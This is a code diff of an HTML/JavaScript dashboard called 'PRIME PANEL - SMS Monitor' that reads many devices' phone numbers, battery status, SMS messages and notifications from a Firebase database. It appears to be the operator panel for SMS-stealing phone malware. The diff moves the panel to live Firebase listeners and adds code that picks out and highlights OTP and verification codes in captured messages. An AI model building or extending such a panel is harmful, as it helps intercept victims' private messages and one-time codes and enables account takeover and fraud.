@@ -4,6 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PRIME PANEL - SMS Monitor</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
         * {
             margin: 0;
@@ -16,7 +19,7 @@
             background: #0a0e17;
             color: #e0e0e0;
             min-height: 100vh;
-            padding: 16px;
+            padding: 12px;
         }
 
         .container {
@@ -29,23 +32,23 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 16px 24px;
+            padding: 12px 20px;
             background: rgba(20, 30, 50, 0.8);
-            border-radius: 12px;
+            border-radius: 10px;
             border: 1px solid rgba(100, 150, 255, 0.08);
-            margin-bottom: 20px;
+            margin-bottom: 12px;
             flex-wrap: wrap;
-            gap: 12px;
+            gap: 8px;
         }
 
         .header-left h1 {
-            font-size: 20px;
+            font-size: 18px;
             color: #4fc3f7;
             font-weight: 700;
         }
 
         .header-left .subtitle {
-            font-size: 11px;
+            font-size: 10px;
             color: #8899aa;
             letter-spacing: 1px;
         }
@@ -59,7 +62,7 @@
 
         .header-right .stats {
             display: flex;
-            gap: 16px;
+            gap: 20px;
         }
 
         .header-right .stat-item {
@@ -77,24 +80,25 @@
         }
 
         .header-right .stat-item .label {
-            font-size: 10px;
+            font-size: 9px;
             color: #8899aa;
             letter-spacing: 0.5px;
+            text-transform: uppercase;
         }
 
         .refresh-btn {
-            background: rgba(79, 195, 247, 0.15);
+            background: rgba(79, 195, 247, 0.1);
             color: #4fc3f7;
-            border: 1px solid rgba(79, 195, 247, 0.3);
-            padding: 6px 16px;
+            border: 1px solid rgba(79, 195, 247, 0.2);
+            padding: 5px 14px;
             border-radius: 6px;
-            font-size: 12px;
+            font-size: 11px;
             cursor: pointer;
             transition: all 0.3s;
         }
 
         .refresh-btn:hover {
-            background: rgba(79, 195, 247, 0.25);
+            background: rgba(79, 195, 247, 0.2);
         }
 
         .refresh-btn:disabled {
@@ -102,22 +106,37 @@
             cursor: not-allowed;
         }
 
+        .live-badge {
+            font-size: 10px;
+            color: #4caf50;
+            background: rgba(76, 175, 80, 0.15);
+            padding: 2px 10px;
+            border-radius: 12px;
+            border: 1px solid rgba(76, 175, 80, 0.2);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
         /* SIM Slots */
         .sim-slots {
             display: flex;
-            gap: 6px;
-            margin-bottom: 16px;
+            gap: 4px;
+            margin-bottom: 12px;
             flex-wrap: wrap;
         }
 
         .sim-slot {
             background: rgba(20, 30, 50, 0.6);
-            border: 1px solid rgba(100, 150, 255, 0.08);
-            border-radius: 8px;
-            padding: 8px 16px;
-            min-width: 50px;
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            border-radius: 6px;
+            padding: 6px 14px;
+            min-width: 40px;
             text-align: center;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 600;
             color: #8899aa;
             cursor: pointer;
@@ -125,27 +144,26 @@
         }
 
         .sim-slot:hover {
-            border-color: rgba(79, 195, 247, 0.3);
+            border-color: rgba(79, 195, 247, 0.2);
             background: rgba(79, 195, 247, 0.05);
         }
 
         .sim-slot.active {
             border-color: #4fc3f7;
             color: #4fc3f7;
-            background: rgba(79, 195, 247, 0.1);
-            box-shadow: 0 0 20px rgba(79, 195, 247, 0.05);
+            background: rgba(79, 195, 247, 0.08);
         }
 
         .sim-slot .slot-number {
-            font-size: 10px;
-            color: #667;
+            font-size: 9px;
+            color: #556;
         }
 
         /* Main Layout */
         .main-layout {
             display: grid;
-            grid-template-columns: 1fr 340px;
-            gap: 16px;
+            grid-template-columns: 1fr 380px;
+            gap: 12px;
         }
 
         @media (max-width: 1024px) {
@@ -154,84 +172,84 @@
             }
         }
 
-        /* Left Panel - Device Grid */
+        /* Left Panel */
         .devices-panel {
             background: rgba(20, 30, 50, 0.6);
-            border-radius: 12px;
-            border: 1px solid rgba(100, 150, 255, 0.08);
-            padding: 16px;
+            border-radius: 10px;
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            padding: 14px;
         }
 
         .panel-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             flex-wrap: wrap;
-            gap: 8px;
+            gap: 6px;
         }
 
         .panel-header h2 {
-            font-size: 16px;
+            font-size: 14px;
             color: #c8d0d8;
             font-weight: 500;
         }
 
         .panel-header .badge {
-            font-size: 11px;
+            font-size: 10px;
             color: #8899aa;
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(255, 255, 255, 0.04);
             padding: 2px 10px;
-            border-radius: 12px;
+            border-radius: 10px;
         }
 
         .search-box {
             display: flex;
-            gap: 8px;
-            margin-bottom: 12px;
+            gap: 6px;
+            margin-bottom: 10px;
         }
 
         .search-box input {
             flex: 1;
             background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(100, 150, 255, 0.08);
-            border-radius: 8px;
-            padding: 8px 14px;
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            border-radius: 6px;
+            padding: 6px 12px;
             color: #c8d0d8;
-            font-size: 13px;
+            font-size: 12px;
             outline: none;
             transition: all 0.3s;
         }
 
         .search-box input::placeholder {
-            color: #556;
+            color: #445;
         }
 
         .search-box input:focus {
-            border-color: rgba(79, 195, 247, 0.3);
+            border-color: rgba(79, 195, 247, 0.2);
         }
 
         .toggle-group {
             display: flex;
-            gap: 4px;
+            gap: 3px;
             background: rgba(0, 0, 0, 0.3);
-            border-radius: 8px;
-            padding: 3px;
+            border-radius: 6px;
+            padding: 2px;
         }
 
         .toggle-group button {
             background: transparent;
             border: none;
             color: #8899aa;
-            padding: 4px 12px;
-            border-radius: 6px;
-            font-size: 11px;
+            padding: 3px 12px;
+            border-radius: 4px;
+            font-size: 10px;
             cursor: pointer;
             transition: all 0.3s;
         }
 
         .toggle-group button.active {
-            background: rgba(79, 195, 247, 0.15);
+            background: rgba(79, 195, 247, 0.12);
             color: #4fc3f7;
         }
 
@@ -242,14 +260,14 @@
         .devices-grid {
             display: grid;
             grid-template-columns: 1fr;
-            gap: 8px;
-            max-height: 600px;
+            gap: 6px;
+            max-height: 500px;
             overflow-y: auto;
-            padding-right: 4px;
+            padding-right: 3px;
         }
 
         .devices-grid::-webkit-scrollbar {
-            width: 4px;
+            width: 3px;
         }
 
         .devices-grid::-webkit-scrollbar-track {
@@ -258,31 +276,31 @@
         }
 
         .devices-grid::-webkit-scrollbar-thumb {
-            background: rgba(79, 195, 247, 0.2);
+            background: rgba(79, 195, 247, 0.15);
             border-radius: 2px;
         }
 
         .device-card {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 12px 16px;
-            border: 1px solid rgba(100, 150, 255, 0.06);
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 8px;
+            padding: 10px 14px;
+            border: 1px solid rgba(100, 150, 255, 0.04);
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.2s;
         }
 
         .device-card:hover {
-            border-color: rgba(79, 195, 247, 0.15);
-            background: rgba(0, 0, 0, 0.4);
+            border-color: rgba(79, 195, 247, 0.1);
+            background: rgba(0, 0, 0, 0.35);
         }
 
         .device-card.selected {
             border-color: #4fc3f7;
-            background: rgba(79, 195, 247, 0.05);
+            background: rgba(79, 195, 247, 0.06);
         }
 
         .device-card.offline {
-            opacity: 0.5;
+            opacity: 0.4;
         }
 
         .device-card .device-row {
@@ -293,8 +311,8 @@
 
         .device-card .device-id {
             font-family: monospace;
-            font-size: 12px;
-            color: #8899aa;
+            font-size: 11px;
+            color: #667;
         }
 
         .device-card .device-phone {
@@ -315,44 +333,44 @@
         .device-card .device-status {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 8px;
         }
 
         .device-card .status-dot {
-            width: 8px;
-            height: 8px;
+            width: 6px;
+            height: 6px;
             border-radius: 50%;
             display: inline-block;
         }
 
         .device-card .status-dot.online {
             background: #4caf50;
-            box-shadow: 0 0 10px rgba(76, 175, 80, 0.3);
+            box-shadow: 0 0 8px rgba(76, 175, 80, 0.3);
         }
 
         .device-card .status-dot.offline {
-            background: #555;
+            background: #444;
         }
 
         .device-card .battery {
-            font-size: 12px;
-            color: #8899aa;
+            font-size: 11px;
+            color: #667;
         }
 
         .device-card .sms-count {
-            font-size: 11px;
-            color: #667;
-            background: rgba(255, 255, 255, 0.05);
-            padding: 2px 10px;
-            border-radius: 12px;
+            font-size: 10px;
+            color: #556;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 1px 8px;
+            border-radius: 10px;
         }
 
         .device-card .device-sms-preview {
-            margin-top: 8px;
-            padding-top: 8px;
-            border-top: 1px solid rgba(255, 255, 255, 0.04);
-            font-size: 12px;
-            color: #8899aa;
+            margin-top: 6px;
+            padding-top: 6px;
+            border-top: 1px solid rgba(255, 255, 255, 0.03);
+            font-size: 11px;
+            color: #667;
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
@@ -362,15 +380,15 @@
             color: #4fc3f7;
         }
 
-        /* Right Panel - SMS Inbox */
+        /* Right Panel - Inbox */
         .inbox-panel {
             background: rgba(20, 30, 50, 0.6);
-            border-radius: 12px;
-            border: 1px solid rgba(100, 150, 255, 0.08);
-            padding: 16px;
+            border-radius: 10px;
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            padding: 14px;
             display: flex;
             flex-direction: column;
-            max-height: 700px;
+            max-height: 600px;
         }
 
         .inbox-panel .panel-header {
@@ -378,14 +396,14 @@
         }
 
         .inbox-panel .panel-header h2 {
-            font-size: 16px;
+            font-size: 14px;
             color: #c8d0d8;
             font-weight: 500;
         }
 
         .inbox-panel .panel-header .device-info {
-            font-size: 12px;
-            color: #8899aa;
+            font-size: 11px;
+            color: #667;
         }
 
         .inbox-panel .panel-header .device-info strong {
@@ -395,12 +413,12 @@
         .inbox-messages {
             flex: 1;
             overflow-y: auto;
-            padding-right: 4px;
-            margin-top: 8px;
+            padding-right: 3px;
+            margin-top: 6px;
         }
 
         .inbox-messages::-webkit-scrollbar {
-            width: 4px;
+            width: 3px;
         }
 
         .inbox-messages::-webkit-scrollbar-track {
@@ -409,134 +427,87 @@
         }
 
         .inbox-messages::-webkit-scrollbar-thumb {
-            background: rgba(79, 195, 247, 0.2);
+            background: rgba(79, 195, 247, 0.15);
             border-radius: 2px;
         }
 
         .inbox-message {
             background: rgba(0, 0, 0, 0.2);
-            border-radius: 8px;
-            padding: 10px 14px;
-            margin-bottom: 6px;
-            border-left: 2px solid rgba(79, 195, 247, 0.2);
+            border-radius: 6px;
+            padding: 8px 12px;
+            margin-bottom: 4px;
+            border-left: 2px solid rgba(79, 195, 247, 0.15);
+            animation: slideIn 0.3s ease;
         }
 
         .inbox-message .msg-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 4px;
+            margin-bottom: 3px;
         }
 
         .inbox-message .msg-sender {
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 600;
             color: #4fc3f7;
         }
 
         .inbox-message .msg-time {
-            font-size: 10px;
-            color: #667;
+            font-size: 9px;
+            color: #445;
         }
 
         .inbox-message .msg-body {
-            font-size: 13px;
+            font-size: 12px;
             color: #c8d0d8;
             word-break: break-word;
-            line-height: 1.5;
+            line-height: 1.4;
         }
 
         .inbox-message .msg-body .highlight {
             color: #ff9800;
         }
 
+        .inbox-message .msg-body .otp-code {
+            color: #ff9800;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
         .inbox-placeholder {
             text-align: center;
-            color: #8899aa;
-            font-size: 13px;
-            padding: 40px 0;
-        }
-
-        /* Global Feed */
-        .feed-section {
-            margin-top: 16px;
-            background: rgba(20, 30, 50, 0.6);
-            border-radius: 12px;
-            border: 1px solid rgba(100, 150, 255, 0.08);
-            padding: 12px 16px;
-        }
-
-        .feed-section .feed-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 8px;
-        }
-
-        .feed-section .feed-header h3 {
-            font-size: 13px;
-            color: #8899aa;
-            font-weight: 500;
-        }
-
-        .feed-section .feed-header .feed-count {
-            font-size: 11px;
-            color: #667;
-        }
-
-        .feed-messages {
-            max-height: 120px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-        }
-
-        .feed-messages::-webkit-scrollbar {
-            width: 3px;
-        }
-
-        .feed-messages::-webkit-scrollbar-thumb {
-            background: rgba(79, 195, 247, 0.2);
-            border-radius: 2px;
-        }
-
-        .feed-item {
-            font-size: 12px;
-            color: #8899aa;
-            padding: 4px 8px;
-            background: rgba(0, 0, 0, 0.15);
-            border-radius: 4px;
-            display: flex;
-            gap: 8px;
-            animation: fadeIn 0.3s ease;
-        }
-
-        .feed-item .feed-device {
-            color: #4fc3f7;
-            font-weight: 500;
-            white-space: nowrap;
-            font-family: monospace;
-            font-size: 11px;
-        }
-
-        .feed-item .feed-msg {
-            flex: 1;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .feed-item .feed-time {
             color: #556;
-            font-size: 10px;
-            white-space: nowrap;
+            font-size: 12px;
+            padding: 30px 0;
         }
 
-        @keyframes fadeIn {
+        /* Loading */
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #556;
+            font-size: 12px;
+        }
+
+        .spinner {
+            border: 2px solid rgba(79, 195, 247, 0.1);
+            border-top: 2px solid #4fc3f7;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 6px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes slideIn {
             from {
                 opacity: 0;
-                transform: translateY(-4px);
+                transform: translateY(-6px);
             }
             to {
                 opacity: 1;
@@ -544,37 +515,18 @@
             }
         }
 
-        .loading {
-            text-align: center;
-            padding: 20px;
-            color: #8899aa;
-        }
-
-        .spinner {
-            border: 2px solid rgba(79, 195, 247, 0.1);
-            border-top: 2px solid #4fc3f7;
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 8px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
+        /* Toast */
         .toast {
             position: fixed;
             bottom: 20px;
             left: 50%;
             transform: translateX(-50%);
             background: rgba(20, 30, 50, 0.95);
-            padding: 10px 24px;
-            border-radius: 8px;
-            border: 1px solid rgba(79, 195, 247, 0.2);
+            padding: 8px 20px;
+            border-radius: 6px;
+            border: 1px solid rgba(79, 195, 247, 0.15);
             color: #c8d0d8;
-            font-size: 13px;
+            font-size: 12px;
             display: none;
             z-index: 1000;
             animation: fadeIn 0.3s ease;
@@ -584,36 +536,20 @@
             display: block;
         }
 
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-50%) translateY(10px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+
+        /* Responsive */
         @media (max-width: 768px) {
-            body {
-                padding: 10px;
-            }
-
-            .header {
-                padding: 12px 16px;
-                flex-direction: column;
-                align-items: stretch;
-            }
-
-            .header-right {
-                justify-content: space-between;
-            }
-
-            .main-layout {
-                grid-template-columns: 1fr;
-            }
-
-            .inbox-panel {
-                max-height: 400px;
-            }
-
-            .devices-grid {
-                max-height: 400px;
-            }
-
-            .sim-slots {
-                justify-content: center;
-            }
+            body { padding: 8px; }
+            .header { padding: 10px 14px; flex-direction: column; align-items: stretch; }
+            .header-right { justify-content: space-between; }
+            .main-layout { grid-template-columns: 1fr; }
+            .inbox-panel { max-height: 350px; }
+            .devices-grid { max-height: 300px; }
+            .sim-slots { justify-content: center; }
         }
     </style>
 </head>
@@ -627,6 +563,7 @@
             <div class="subtitle">REAL-TIME SMS MONITORING SYSTEM</div>
         </div>
         <div class="header-right">
+            <span class="live-badge">● LIVE</span>
             <div class="stats">
                 <div class="stat-item">
                     <div class="number online" id="onlineCount">0</div>
@@ -637,7 +574,7 @@
                     <div class="label">NEW SMS</div>
                 </div>
             </div>
-            <button class="refresh-btn" id="refreshBtn" onclick="fetchAllData()">🔄 Refresh</button>
+            <button class="refresh-btn" onclick="manualRefresh()">🔄 Refresh</button>
         </div>
     </div>
 
@@ -668,12 +605,8 @@
                     <button id="onlineToggle" onclick="setFilter('online')">Online</button>
                 </div>
             </div>
-            <div id="loadingIndicator" class="loading" style="display:none;">
-                <div class="spinner"></div>
-                <p>Loading devices...</p>
-            </div>
             <div class="devices-grid" id="devicesGrid">
-                <div class="loading">No devices loaded</div>
+                <div class="loading">Loading devices...</div>
             </div>
         </div>
 
@@ -684,22 +617,11 @@
                     <h2>📨 SMS Inbox</h2>
                     <div class="device-info" id="selectedDeviceInfo">Select a device to view messages</div>
                 </div>
-                <div class="device-info" id="smsTotalCount" style="font-size:12px;color:#667;"></div>
+                <div class="device-info" id="smsTotalCount" style="font-size:10px;color:#556;"></div>
             </div>
             <div class="inbox-messages" id="inboxMessages">
                 <div class="inbox-placeholder">👈 Select a device from the left</div>
             </div>
-        </div>
-    </div>
-
-    <!-- Global Feed -->
-    <div class="feed-section">
-        <div class="feed-header">
-            <h3>🌐 Global Message Feed</h3>
-            <span class="feed-count" id="feedCount">0 messages</span>
-        </div>
-        <div class="feed-messages" id="feedMessages">
-            <div style="color:#8899aa;font-size:12px;padding:8px;text-align:center;">Waiting for messages...</div>
         </div>
     </div>
 </div>
@@ -708,15 +630,20 @@
 <div class="toast" id="toast"></div>
 
 <script>
-    // ===== CONFIGURATION =====
-    const API_BASE = 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app';
-    const USERS_URL = `${API_BASE}/users.json?shallow=true`;
+    // ===== FIREBASE CONFIG =====
+    const firebaseConfig = {
+        databaseURL: "https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app"
+    };
 
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // ===== STATE =====
     let allUsers = {};
     let selectedDeviceId = null;
     let currentFilter = 'all';
     let searchQuery = '';
-    let refreshInterval = null;
+    let isInitialLoad = true;
 
     // ===== TOAST =====
     function showToast(msg) {
@@ -724,15 +651,14 @@
         toast.textContent = msg;
         toast.classList.add('show');
         clearTimeout(toast._timeout);
-        toast._timeout = setTimeout(() => toast.classList.remove('show'), 2500);
+        toast._timeout = setTimeout(() => toast.classList.remove('show'), 2000);
     }
 
-    // ===== COPY TO CLIPBOARD =====
+    // ===== COPY =====
     function copyToClipboard(text) {
         navigator.clipboard?.writeText(text).then(() => {
             showToast(`📋 Copied: ${text}`);
         }).catch(() => {
-            // Fallback
             const input = document.createElement('input');
             input.value = text;
             document.body.appendChild(input);
@@ -743,31 +669,7 @@
         });
     }
 
-    // ===== DATA FETCHING =====
-    async function fetchUserIds() {
-        try {
-            const response = await fetch(USERS_URL);
-            if (!response.ok) throw new Error(`HTTP ${response.status}`);
-            const data = await response.json();
-            return Object.keys(data);
-        } catch (error) {
-            console.error('Fetch user IDs error:', error);
-            return [];
-        }
-    }
-
-    async function fetchUserData(userId) {
-        try {
-            const url = `${API_BASE}/users/${userId}.json`;
-            const response = await fetch(url);
-            if (!response.ok) return null;
-            return await response.json();
-        } catch (error) {
-            console.error(`Fetch user ${userId} error:`, error);
-            return null;
-        }
-    }
-
+    // ===== HELPERS =====
     function parseTimestamp(ts) {
         if (!ts) return 'N/A';
         if (typeof ts === 'number') return new Date(ts).toLocaleString();
@@ -816,18 +718,23 @@
         return entries.map(e => ({ id: e[0], ...e[1] }));
     }
 
-    function getNotifications(userData) {
+    function getAllNotifications(userData) {
         if (!userData?.notifications) return [];
         const entries = Object.entries(userData.notifications);
         entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
         return entries.map(e => ({ id: e[0], ...e[1] }));
     }
 
-    // ===== RENDER =====
+    function escapeHtml(text) {
+        if (!text) return '';
+        const div = document.createElement('div');
+        div.textContent = text;
+        return div.innerHTML;
+    }
+
+    // ===== RENDER FUNCTIONS =====
     function renderDevices() {
         const grid = document.getElementById('devicesGrid');
-        const loading = document.getElementById('loadingIndicator');
-        loading.style.display = 'none';
         grid.innerHTML = '';
 
         let userIds = Object.keys(allUsers);
@@ -874,7 +781,7 @@
             let previewHtml = '';
             if (latest && latest.message) {
                 const sender = latest.sender || 'Unknown';
-                const msg = latest.message.length > 60 ? latest.message.substring(0, 60) + '...' : latest.message;
+                const msg = latest.message.length > 50 ? latest.message.substring(0, 50) + '...' : latest.message;
                 previewHtml = `
                     <div class="device-sms-preview">
                         <span class="sender">${escapeHtml(sender)}</span>: ${escapeHtml(msg)}
@@ -885,7 +792,7 @@
             card.innerHTML = `
                 <div class="device-row">
                     <div>
-                        <div class="device-id">${escapeHtml(id.substring(0, 16))}...</div>
+                        <div class="device-id">${escapeHtml(id.substring(0, 14))}...</div>
                         <div class="device-phone ${isCopyable ? 'copyable' : ''}" 
                              onclick="${isCopyable ? `event.stopPropagation(); copyToClipboard('${phone}')` : ''}">
                             ${isCopyable ? '📞 ' : ''}${escapeHtml(displayPhone)}
@@ -894,7 +801,7 @@
                     <div class="device-status">
                         <span class="status-dot ${online ? 'online' : 'offline'}"></span>
                         <span class="battery">🔋 ${battery}%</span>
-                        <span class="sms-count">${smsCount} SMS</span>
+                        <span class="sms-count">${smsCount}</span>
                     </div>
                 </div>
                 ${previewHtml}
@@ -910,6 +817,7 @@
     }
 
     function selectDevice(deviceId) {
+        if (selectedDeviceId === deviceId) return;
         selectedDeviceId = deviceId;
         renderDevices();
         renderInbox();
@@ -931,10 +839,10 @@
         const phone = getPhoneNumber(user) || 'No number';
         const battery = getBattery(user);
         const smsList = getAllSms(user);
-        const notifList = getNotifications(user);
+        const notifList = getAllNotifications(user);
 
         info.innerHTML = `<strong>${escapeHtml(selectedDeviceId.substring(0, 12))}...</strong> · 📞 ${escapeHtml(phone)} · 🔋 ${battery}%`;
-        totalCount.textContent = `${smsList.length} messages`;
+        totalCount.textContent = `${smsList.length + notifList.length} messages`;
 
         if (smsList.length === 0 && notifList.length === 0) {
             container.innerHTML = '<div class="inbox-placeholder">📭 No messages for this device</div>';
@@ -943,7 +851,7 @@
 
         container.innerHTML = '';
 
-        // Show notifications first (they're like messages too)
+        // Show notifications first
         notifList.forEach(notif => {
             const div = document.createElement('div');
             div.className = 'inbox-message';
@@ -962,54 +870,29 @@
             const div = document.createElement('div');
             div.className = 'inbox-message';
             const sender = sms.sender || 'Unknown';
-            const isOTP = /otp/i.test(sms.message);
+            const isOTP = /otp|code|verification/i.test(sms.message);
+            let bodyHtml = escapeHtml(sms.message || '');
+            
+            // Highlight OTP codes
+            if (isOTP) {
+                const otpMatch = sms.message.match(/\b\d{4,6}\b/);
+                if (otpMatch) {
+                    bodyHtml = bodyHtml.replace(otpMatch[0], `<span class="otp-code">${otpMatch[0]}</span>`);
+                }
+            }
+
             div.innerHTML = `
                 <div class="msg-header">
                     <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
                     <span class="msg-time">${parseTimestamp(sms.timestamp)}</span>
                 </div>
-                <div class="msg-body ${isOTP ? 'highlight' : ''}">${escapeHtml(sms.message || '')}</div>
+                <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
             `;
             container.appendChild(div);
         });
-    }
 
-    function renderFeed() {
-        const container = document.getElementById('feedMessages');
-        const countEl = document.getElementById('feedCount');
-
-        const allMsgs = [];
-        for (const id in allUsers) {
-            const smsList = getAllSms(allUsers[id]);
-            smsList.forEach(sms => {
-                if (sms.message) {
-                    allMsgs.push({
-                        deviceId: id,
-                        message: sms.message,
-                        timestamp: sms.timestamp || Date.now(),
-                        sender: sms.sender || 'Unknown'
-                    });
-                }
-            });
-        }
-
-        allMsgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-        const recent = allMsgs.slice(0, 30);
-
-        countEl.textContent = `${allMsgs.length} messages`;
-
-        if (recent.length === 0) {
-            container.innerHTML = '<div style="color:#8899aa;font-size:12px;padding:8px;text-align:center;">Waiting for messages...</div>';
-            return;
-        }
-
-        container.innerHTML = recent.map(msg => `
-            <div class="feed-item">
-                <span class="feed-device">${escapeHtml(msg.deviceId.substring(0, 8))}...</span>
-                <span class="feed-msg">${escapeHtml(msg.message.substring(0, 80))}${msg.message.length > 80 ? '...' : ''}</span>
-                <span class="feed-time">${parseTimestamp(msg.timestamp)}</span>
-            </div>
-        `).join('');
+        // Scroll to top
+        container.scrollTop = 0;
     }
 
     function updateStats() {
@@ -1026,13 +909,6 @@
         document.getElementById('smsCount').textContent = totalSms;
     }
 
-    function escapeHtml(text) {
-        if (!text) return '';
-        const div = document.createElement('div');
-        div.textContent = text;
-        return div.innerHTML;
-    }
-
     // ===== FILTERS =====
     function setFilter(filter) {
         currentFilter = filter;
@@ -1047,76 +923,95 @@
         renderDevices();
     }
 
-    // ===== MAIN FETCH =====
-    async function fetchAllData() {
-        const btn = document.getElementById('refreshBtn');
-        const loading = document.getElementById('loadingIndicator');
-        btn.disabled = true;
-        loading.style.display = 'block';
-
-        try {
-            const userIds = await fetchUserIds();
-            if (userIds.length === 0) {
-                loading.style.display = 'none';
-                document.getElementById('devicesGrid').innerHTML = '<div class="loading">No devices found</div>';
-                btn.disabled = false;
-                return;
-            }
-
-            const promises = userIds.map(id => fetchUserData(id));
-            const results = await Promise.all(promises);
-
-            const newUsers = {};
-            userIds.forEach((id, i) => {
-                if (results[i]) newUsers[id] = results[i];
-            });
-
-            allUsers = newUsers;
-
-            // Preserve selected if still exists
-            if (selectedDeviceId && !allUsers[selectedDeviceId]) {
-                selectedDeviceId = Object.keys(allUsers)[0] || null;
-            }
-
-            renderDevices();
-            renderInbox();
-            renderFeed();
-            updateStats();
-
-        } catch (error) {
-            console.error('Fetch error:', error);
-            document.getElementById('devicesGrid').innerHTML = `
-                <div class="loading">❌ Error: ${escapeHtml(error.message)}<br>
-                <button onclick="fetchAllData()" style="margin-top:8px;background:rgba(79,195,247,0.15);color:#4fc3f7;border:1px solid rgba(79,195,247,0.3);padding:6px 16px;border-radius:6px;cursor:pointer;">Retry</button></div>
-            `;
-        } finally {
-            btn.disabled = false;
-            loading.style.display = 'none';
-        }
+    // ===== MANUAL REFRESH =====
+    function manualRefresh() {
+        showToast('🔄 Refreshing data...');
+        // Firebase listeners are already active, just re-render
+        renderDevices();
+        renderInbox();
+        updateStats();
+        showToast('✅ Data refreshed');
     }
 
-    // ===== AUTO REFRESH =====
-    function startAutoRefresh() {
-        if (refreshInterval) clearInterval(refreshInterval);
-        refreshInterval = setInterval(fetchAllData, 30000);
+    // ===== FIREBASE REAL-TIME LISTENERS =====
+    function setupFirebaseListeners() {
+        const usersRef = database.ref('users');
+
+        // Listen for all user data changes
+        usersRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data) {
+                allUsers = data;
+                renderDevices();
+                renderInbox();
+                updateStats();
+                
+                if (isInitialLoad) {
+                    isInitialLoad = false;
+                    // Auto-select first device
+                    const ids = Object.keys(allUsers);
+                    if (ids.length > 0) {
+                        selectDevice(ids[0]);
+                    }
+                }
+            } else {
+                allUsers = {};
+                renderDevices();
+                renderInbox();
+                updateStats();
+            }
+        });
+
+        // Listen for specific user changes (for instant updates)
+        usersRef.on('child_added', (snapshot) => {
+            const key = snapshot.key;
+            const data = snapshot.val();
+            if (key && data) {
+                allUsers[key] = data;
+                renderDevices();
+                renderInbox();
+                updateStats();
+            }
+        });
+
+        usersRef.on('child_changed', (snapshot) => {
+            const key = snapshot.key;
+            const data = snapshot.val();
+            if (key && data) {
+                allUsers[key] = data;
+                renderDevices();
+                renderInbox();
+                updateStats();
+            }
+        });
+
+        usersRef.on('child_removed', (snapshot) => {
+            const key = snapshot.key;
+            if (key && allUsers[key]) {
+                delete allUsers[key];
+                if (selectedDeviceId === key) {
+                    selectedDeviceId = Object.keys(allUsers)[0] || null;
+                }
+                renderDevices();
+                renderInbox();
+                updateStats();
+            }
+        });
+
+        console.log('✅ Firebase real-time listeners connected');
     }
 
     // ===== INIT =====
     document.addEventListener('DOMContentLoaded', () => {
-        fetchAllData();
-        startAutoRefresh();
-
-        window.addEventListener('beforeunload', () => {
-            if (refreshInterval) clearInterval(refreshInterval);
-        });
+        setupFirebaseListeners();
     });
 
-    // Global functions for onclick
-    window.fetchAllData = fetchAllData;
+    // Make functions global
+    window.copyToClipboard = copyToClipboard;
+    window.selectDevice = selectDevice;
     window.setFilter = setFilter;
     window.filterDevices = filterDevices;
-    window.selectDevice = selectDevice;
-    window.copyToClipboard = copyToClipboard;
+    window.manualRefresh = manualRefresh;
     window.showToast = showToast;
 </script>
 </body>
